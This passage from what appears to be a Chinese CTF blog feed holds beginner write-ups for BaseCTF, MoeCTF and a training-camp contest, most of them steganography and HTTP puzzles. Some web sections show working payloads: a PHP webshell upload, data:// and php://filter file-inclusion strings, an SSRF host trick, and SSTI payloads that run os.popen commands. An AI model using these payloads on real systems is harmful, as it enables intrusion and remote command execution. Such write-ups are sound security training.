class="built_in">print</span>(<span class="string">&#x27;Hello, Python!&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter your flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">&#x27;BaseCTF&#123;&#x27;</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.find(<span class="string">&#x27;Mp&#x27;</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">&#x27;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;&#x27;</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="string">&#x27;_&#x27;</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">&#x27;_&#x27;</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">&#x27;lsT_n&#x27;</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;😺&#x27;</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">&#x27;B😺A😺S😺E😺C😺T😺F😺&#123;😺S&#x27;</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b&#x27;MG1QbA==&#x27;</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">&#x27;7d4372733173&#x27;</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != &#123;<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">    abort(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;whats&#125; &#123;up&#125;&#x27;</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;bro&#x27;</span>) != <span class="string">&#x27;bro 1&#x27;</span>:</span><br><span class="line">    abort(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hashlib.sha1(flag.encode()).hexdigest() != <span class="string">&#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;</span>:</span><br><span class="line">    abort(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;🎉 You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> this</span><br></pre></td></tr></table></figure><p>进行代码分析一步一步来肯定能做出来，但是非常费时间，过程就不写了，反正太费时间了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185450874.png" alt="image-20240815185450874"></p><h4 id="Week1-倒计时？海报！">[Week1] 倒计时？海报！</h4><p>考点：图片隐写</p><p>群里的海报，有十张，每张都潜藏flag的一部分，需要使用ps或者其他调色软件进行调色后寻找（眼睛都要找废了）大概就是像下面的图一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816200115184.png" alt="image-20240816200115184"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816200811716.png" alt="image-20240816200811716"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816201411434.png" alt="image-20240816201411434"></p><p>找齐后按10-1的顺序拼接在一起就是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816201823427.png" alt="image-20240816201823427"></p><h4 id="Week1-你也喜欢圣物吗">[Week1] 你也喜欢圣物吗</h4><p>考点：图片隐写，压缩包伪加密</p><p>打开文件，进行解压缩，发现一个png图片和一个压缩包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222450635.png" alt="image-20240816222450635"></p><p>解压需要密码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222541447.png" alt="image-20240816222541447"></p><p>我刚开始觉得是伪加密，放进010editor查看了一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223911247.png" alt="image-20240816223911247"></p><p>表面上看确实是，但根据后来题目提示发现，里面的另一个压缩包才是伪加密，这个是真有密码。（不知道为什么）</p><p>那就需要从图片入手。刚开始以为是高度，放进010editor里修改，发现没有用。</p><p>然后就用stegsolve打开，发现了信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222825621.png" alt="image-20240816222825621"></p><p>解码这段编码，得到提示</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816222917433.png" alt="image-20240816222917433"></p><p>就是简单的LSB。找到key。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223022332.png" alt="image-20240816223022332"></p><p>解压过后得到里面的另一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223251279.png" alt="image-20240816223251279"></p><p>这个压缩包也需要密码，但是却是伪加密，放进010editor修改过后就能解压，拿到里面的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223452392.png" alt="image-20240816223452392"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223545019.png" alt="image-20240816223545019"></p><p>这里的flag有两个，上面那个是假的，最后那个才是真的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223627484.png" alt="image-20240816223627484"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240816223709957.png" alt="image-20240816223709957"></p><h4 id="Week1-根本进不去啊">[Week1] 根本进不去啊!</h4><p>考点：域名解析</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821155833385.png" alt="image-20240821155833385"></p><p>根据题目提示，进行域名解析，发现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821155809814.png" alt="image-20240821155809814"></p><h4 id="Week1-捂住X只耳">[Week1] 捂住X只耳</h4><p>考点：Audacity的使用</p><p>此解法非官方预期，需要官方解法请看官方wp。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821160008205.png" alt="image-20240821160008205"></p><p>直接人声分离，得到下图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821165703923.png" alt="image-20240821165703923"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821170824565.png" alt="image-20240821170824565"></p><p>用摩斯密码解码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240821171021708.png" alt="image-20240821171021708"></p><p>flag就是BaseCTF{FOLLOWYOURHEART}</p><h2 id="web">web</h2><h4 id="Week1-HTTP-是什么呀">[Week1] HTTP 是什么呀</h4><p>考点：http基础知识</p><p>打开容器，就是普通的http知识</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185636716.png" alt="image-20240815185636716"></p><p>按照提示抓包传入就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185817085.png" alt="image-20240815185817085"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185937091.png" alt="image-20240815185937091"></p><p>爆出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815185954681.png" alt="image-20240815185954681"></p><p>解码得到。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190030770.png" alt="image-20240815190030770"></p><h4 id="Week1-喵喵喵´•ﻌ•">[Week1] 喵喵喵´•ﻌ•`</h4><p>考点：eval()漏洞利用，指令利用</p><p>打开容器，是一个简单的传参利用eval()漏洞问题</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190259501.png" alt="image-20240815190259501"></p><h4 id="Week1-md5绕过欸">[Week1] md5绕过欸</h4><p>考点：MD5绕过</p><p>打开容器，要求get传参name和name2，post传参password和password2。</p><p>分析代码，发现name和password的md5进行弱相等，直接用现成的例子。</p><p>name2和password2的md5值强相等，可以使用数组绕过。（具体看笔记）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815190644451.png" alt="image-20240815190644451"></p><h4 id="Week1-A-Dark-Room">[Week1] A Dark Room</h4><p>考点：查看源代码</p><p>打开容器是个小游戏，但是其实考点是查看源代码。不过这游戏还挺有意思的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191053648.png" alt="image-20240815191053648"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191109940.png" alt="image-20240815191109940"></p><h4 id="Week1-upload">[Week1] upload</h4><p>考点：文件上传漏洞，一句话木马，webshell连接工具（蚁剑）</p><p>打开容器发现是文件上传。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191232696.png" alt="image-20240815191232696"></p><p>先进行准备，用记事本写上一句话木马，因为要上传图片文件，所以后缀改成.jpg</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191551084.png" alt="image-20240815191551084"></p><p>进行文件上传，用bp抓包，修改.jpg为.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191710890.png" alt="image-20240815191710890"></p><p>上传完了后找到该php文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191810966.png" alt="image-20240815191810966"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191827494.png" alt="image-20240815191827494"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815191842431.png" alt="image-20240815191842431"></p><p>是空白是正常的，因为修改了后缀，不是jpg，是个损坏图片文件。只需要上面的路径，然后用蚁剑连接就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192026311.png" alt="image-20240815192026311"></p><p>连接密码就是传参变量名。这里就是cmd</p><p>进入文件管理找到flag就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192129003.png" alt="image-20240815192129003"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815192141082.png" alt="image-20240815192141082"></p><p>ps：这是在前端限制的情况下，简单，但是可能会有很多其他绕过，现在暂时没遇到，以后肯定会遇到。</p><h4 id="Week1-Aura-酱的礼物">[Week1] Aura 酱的礼物</h4><p>考点：代码审计，伪协议，SSRF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Aura 酱，欢迎回家~</span><br><span class="line">// 这里有一份礼物，请你签收一下哟~</span><br><span class="line">$pen = $_POST[&#x27;pen&#x27;];</span><br><span class="line">if (file_get_contents($pen) !== &#x27;Aura&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="line">$challenge = $_POST[&#x27;challenge&#x27;];</span><br><span class="line">if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;这不是 Aura 的博客！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$blog_content = file_get_contents($challenge);</span><br><span class="line">if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;请去博客里面写下感想哦~&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="line">$gift = $_POST[&#x27;gift&#x27;];</span><br><span class="line">include($gift);</span><br></pre></td></tr></table></figure><p>分析代码，有三个变量，全是post方法传参。</p><p>第一个需要使用data协议绕过file_get_concents()函数。构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pen=data://text/plain;base64,QXVyYQ==</span><br></pre></td></tr></table></figure><p>第二个就涉及到SSTR漏洞（见笔记）。构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge=http://jasmineaura.github.io@challenge.basectf.fun:34667</span><br></pre></td></tr></table></figure><p>第三个就是文件包含漏洞，需要filter协议绕过。构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gift=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817225236931.png" alt="image-20240817225236931"></p><p>解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817225312658.png" alt="image-20240817225312658"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf-week1-wp</title>
      <link href="/posts/177a214a.html"/>
      <url>/posts/177a214a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1>Misc</h1><h2 id="signin">signin</h2><p>登录网站，是个签到的题，根据提示直接让luo缺勤，其他全补签就可以了。（我第一次的时候还专门给其他人缺勤了，真是个好老师了。）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810151950359.png" alt="image-20240810151950359"></p><h2 id="罗小黑战记">罗小黑战记</h2><p>考点：动态图片</p><p>下载文件，是个116张图组成的动图，一帧一帧看，看到一个二维码，扫一扫出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152201508.png" alt="image-20240810152201508"></p><h2 id="杂项入门指北">杂项入门指北</h2><p>考点：摩斯密码</p><p>这个下载后是群里的入门文件和海报，线索在海报上，仔细观察就能看到摩斯密码。（找了好久才看到）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152343047.png" alt="image-20240810152343047"></p><p><img src="C:%5CUsers%5C%E8%83%A1%E5%B9%BF%E5%B7%9D%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240810152357028.png" alt="image-20240810152357028"></p><p>放进工具里解码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152505225.png" alt="image-20240810152505225"></p><p>不知道哪里出了点小问题，多了个‘T1’，要删除前面的，删后面的不行（恼火）</p><h2 id="ez-F5">ez-F5</h2><p>考点：F5隐写</p><p>下载文件，是一个jpg文件，根据题目可知，应该是F5隐写工具。</p><p>在属性里找到备注信息</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184844735.png" alt="image-20240812184844735"></p><p>是base64，解码后得到no_password，盲猜是F5的密码。</p><p>使用工具拿到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184708960.png" alt="image-20240812184708960"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240812184612024.png" alt="image-20240812184612024"></p><h1>web</h1><h2 id="Web渗透测试与审计入门指北">Web渗透测试与审计入门指北</h2><p>就用他给的文件搭建个环境，然后进网站就拿到flag。</p><h2 id="弗拉格之地的入口">弗拉格之地的入口</h2><p>考点：爬虫管理</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810152955144.png" alt="image-20240810152955144"></p><p>关键词“爬虫”，马上想到/robots.txt。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153043136.png" alt="image-20240810153043136"></p><p>访问出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153122557.png" alt="image-20240810153122557"></p><h2 id="ez-http">ez_http</h2><p>考点：http基础</p><p>考察http基础知识（不难但复杂）。打开网站，根据提示进行输入。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153501204.png" alt="image-20240810153501204"></p><p>先post,再get。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153400287.png" alt="image-20240810153400287"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153542605.png" alt="image-20240810153542605"></p><p>这里困了我半天（汗）。要修改source，先pb进行抓包，修改referer就行。</p><p>为了方便，直接在重放器里面进行了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153825556.png" alt="image-20240810153825556"></p><p>再是修改Cookie。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153913196.png" alt="image-20240810153913196"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810153935693.png" alt="image-20240810153935693"></p><p>下一个是要修改浏览器，就是修改User-Agent。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154052149.png" alt="image-20240810154052149"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154117863.png" alt="image-20240810154117863"></p><p>然后是修改本地访问（幸好之前有笔记），在请求头里面添加 X-Forwarded-For:127.0.0.1 就可以了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154158461.png" alt="image-20240810154158461"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154233997.png" alt="image-20240810154233997"></p><p>拿到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810154330859.png" alt="image-20240810154330859"></p><h2 id="弗拉格之地的挑战">弗拉格之地的挑战</h2><p>考点：http基础，查看源代码，控制台运行，上传木马，后台连接</p><p>打开网站，收集七颗龙珠。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173418160.png" alt="image-20240810173418160"></p><p>进入第一关，简单查看源代码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173447584.png" alt="image-20240810173447584"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173459995.png" alt="image-20240810173459995"></p><p>进入第二关。查看网络请求包，发现线索。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173551821.png" alt="image-20240810173551821"></p><p>进入第三关。先get,再post，再修改Cookie变成admin。（修改身份验证就是修改Cookie）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173729509.png" alt="image-20240810173729509"></p><p>进入第四关。这里耍了个把戏。从他的意思知道要修改来源source，抓包修改referer就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810173856717.png" alt="image-20240810173856717"></p><p><img src="C:%5CUsers%5C%E8%83%A1%E5%B9%BF%E5%B7%9D%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240810174008816.png" alt="image-20240810174008816"></p><p>正式进入第四关。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174108333.png" alt="image-20240810174108333"></p><p>这里点开始他怎么都是9。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174140720.png" alt="image-20240810174140720"></p><p>要想个法子，看源码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174225334.png" alt="image-20240810174225334"></p><p>直接在控制台重构这个函数，将button.id改成8，然后点8就过关了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174319507.png" alt="image-20240810174319507"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174418710.png" alt="image-20240810174418710"></p><p>这也提醒我前端的一切都可以更改。</p><p>接下来去第五关。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174506622.png" alt="image-20240810174506622"></p><p>先老实输入试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174550396.png" alt="image-20240810174550396"></p><p>emmmm…，好嘛，根据提示说前端不靠谱，估计又是要更改前端。找到控制函数修改。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174717389.png" alt="image-20240810174717389"></p><p>把false改成true就ok了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174807544.png" alt="image-20240810174807544"></p><p>进入第六关（终于快到了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810174914705.png" alt="image-20240810174914705"></p><p>读代码，get一个，post一个，但基本都是用get的判断。大致意思就是不能匹配小写flag，但是必须匹配到flag，大小写都可以，所以只有大写传入了。</p><p>进入第七关（文件上传漏洞雏形，使用中国蚁剑）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810175150389.png" alt="image-20240810175150389"></p><p>第一反应，这不就是直接输入命令嘛，试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810175256329.png" alt="image-20240810175256329"></p><p>没看到什么有用的，直接找flag试试。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181009670.png" alt="image-20240810181009670"></p><p>本来能找到的，不知道为什么又找不到了（恼火）</p><p>用蚁剑算了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181114495.png" alt="image-20240810181114495"></p><p>网站就是当前网址，连接密码就是参数名。连上过后双击进去，然后找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181252784.png" alt="image-20240810181252784"></p><p>这里有个小彩蛋。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181318978.png" alt="image-20240810181318978"></p><p>说实话才看到还是挺大感触的。作为一个新手，靠自己一步一步的解出来题，成就感还是蛮大的。</p><p>最后将7个flag合在一起，解码，就得到flag了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240810181436782.png" alt="image-20240810181436782"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届山石ctf训练营结营（招新）赛wp</title>
      <link href="/posts/2a9a0bf1.html"/>
      <url>/posts/2a9a0bf1.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="签到题">签到题</h2><p>根据提示关注公众号，发flag。</p><h2 id="play4fun">play4fun</h2><p>下载压缩包后打开flag.txt文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171134109.png" alt="image-20240809171134109"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171201582.png" alt="image-20240809171201582"></p><p>是一串0和1的码，直接解码出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171340535.png" alt="image-20240809171340535"></p><h2 id="dog">dog</h2><p>下载压缩包，解压发现是一条狗的图片。根据题目提示“狗狗的下巴呢?”</p><p>，猜测图片要修改高度，放进010editor里修改。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171556562.png" alt="image-20240809171556562"></p><p>最后看到图片里面的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240809171631326.png" alt="image-20240809171631326"></p><h2 id="timestamp">timestamp</h2><p>打开文件发现一个txt文件和压缩包，解压缩需要密码，使用要从txt文件入手。</p><p>仔细查看txt文件，发现是空白格隐藏，需要用到工具SNOW。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814162822412.png" alt="image-20240814162822412"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814162859033.png" alt="image-20240814162859033"></p><p>拿到密码后解压缩。</p><p>发现文件大小等全部一样，只有修改时间不一样，这就想到时间戳了。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814163001102.png" alt="image-20240814163001102"></p><p>使用获取时间戳的代码获取时间戳，发现后三位不一样，提取后三位出来。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814163558008.png" alt="image-20240814163558008"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814164510267.png" alt="image-20240814164510267"></p><p>ascll码进行解码，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240814164829973.png" alt="image-20240814164829973"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞</title>
      <link href="/posts/60e82712.html"/>
      <url>/posts/60e82712.html</url>
      
        <content type="html"><![CDATA[<p>SSTI漏洞：</p><p>超详细SSTI模板注入漏洞原理讲解_ssti注入-CSDN博客：<a href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p><p>焚靖工具安装:<a href="https://blog.csdn.net/m0_73683234/article/details/136789243">https://blog.csdn.net/m0_73683234/article/details/136789243</a></p><p>判断方法：</p><p>变量名=49   ＃如果正常回显，说明存在SSTI漏洞</p><p>python中的特殊属性：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c91f104c1ff705ad11a5a16052b6edc2.png" alt=""></p><p>常用的解题payload:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4076ea7b77cac94b078adab61bece939.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;config.__class__.__init__.globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span 